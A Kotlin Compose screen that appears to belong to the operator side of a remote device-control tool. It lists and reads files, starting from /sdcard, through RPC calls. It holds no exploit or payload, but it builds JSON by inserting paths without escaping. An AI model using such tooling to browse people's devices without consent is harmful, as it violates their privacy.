package com.shadow.operator.ui.filemanager

import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.shadow.operator.data.RpcClient
import com.shadow.operator.ui.theme.*
import kotlinx.coroutines.launch

data class FileEntry(val type: String, val size: String, val name: String)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun FileManagerScreen(
    rpc: RpcClient,
    onNavigateBack: () -> Unit
) {
    var currentPath by remember { mutableStateOf("/sdcard") }
    var files by remember { mutableStateOf<List<FileEntry>>(emptyList()) }
    var fileContent by remember { mutableStateOf<String?>(null) }
    var loading by remember { mutableStateOf(false) }
    val scope = rememberCoroutineScope()

    fun listFiles(path: String) {
        currentPath = path
        fileContent = null
        loading = true
        scope.launch {
            val result = rpc.execute("fs_list", """{"path":"$path"}""")
            loading = false
            files = (result ?: "ERROR")
                .split("\n")
                .filter { it.isNotBlank() && !it.startsWith("ERROR") }
                .mapNotNull { line ->
                    val parts = line.split("\t")
                    if (parts.size >= 3) {
                        FileEntry(parts[0], parts[1], parts.drop(2).joinToString("\t"))
                    } else null
                }
        }
    }

    LaunchedEffect(Unit) { listFiles("/sdcard") }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Column {
                        Text(
                            "Files",
                            color = TextPrimary,
                            fontFamily = FontFamily.Monospace,
                            fontSize = 18.sp
                        )
                        Text(
                            currentPath,
                            color = TextSecondary,
                            fontFamily = FontFamily.Monospace,
                            fontSize = 11.sp
                        )
                    }
                },
                navigationIcon = {
                    IconButton(onClick = {
                        if (fileContent != null) {
                            fileContent = null
                        } else if (currentPath != "/") {
                            val parent = currentPath.substringBeforeLast("/")
                            listFiles(if (parent.isEmpty()) "/" else parent)
                        } else {
                            onNavigateBack()
                        }
                    }) {
                        Icon(Icons.Default.ArrowBack, contentDescription = "Back", tint = TextPrimary)
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = SurfaceDark)
            )
        },
        containerColor = BgBlack
    ) { padding ->
        if (loading) {
            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(padding),
                contentAlignment = Alignment.Center
            ) {
                CircularProgressIndicator(color = AccentGreen)
            }
        } else if (fileContent != null) {
            // File content viewer
            LazyColumn(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(padding)
                    .padding(horizontal = 12.dp)
            ) {
                item {
                    Text(
                        fileContent ?: "",
                        color = TextPrimary,
                        fontFamily = FontFamily.Monospace,
                        fontSize = 12.sp,
                        lineHeight = 16.sp
                    )
                }
            }
        } else {
            LazyColumn(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(padding)
            ) {
                items(files) { file ->
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .clickable {
                                val fullPath = if (currentPath == "/") "/${file.name}" else "$currentPath/${file.name}"
                                if (file.type == "d") {
                                    listFiles(fullPath)
                                } else if (file.size.toLongOrNull()?.let { it < 512_000 } == true) {
                                    // Read small files
                                    scope.launch {
                                        val content = rpc.execute("fs_read", """{"path":"$fullPath"}""")
                                        fileContent = content
                                    }
                                }
                            }
                            .padding(horizontal = 16.dp, vertical = 10.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Icon(
                            if (file.type == "d") Icons.Default.Folder else Icons.Default.Description,
                            contentDescription = null,
                            tint = if (file.type == "d") AccentAmber else TextSecondary,
                            modifier = Modifier.size(18.dp)
                        )
                        Spacer(Modifier.width(12.dp))
                        Text(
                            file.name,
                            color = TextPrimary,
                            fontFamily = FontFamily.Monospace,
                            fontSize = 13.sp,
                            modifier = Modifier.weight(1f)
                        )
                        Text(
                            formatSize(file.size.toLongOrNull() ?: 0),
                            color = TextSecondary,
                            fontFamily = FontFamily.Monospace,
                            fontSize = 11.sp
                        )
                    }
                }
            }
        }
    }
}

fun formatSize(bytes: Long): String {
    return when {
        bytes >= 1_000_000 -> "%.1fM".format(bytes / 1_000_000.0)
        bytes >= 1_000 -> "%.1fK".format(bytes / 1_000.0)
        bytes > 0 -> "${bytes}B"
        else -> ""
    }
}
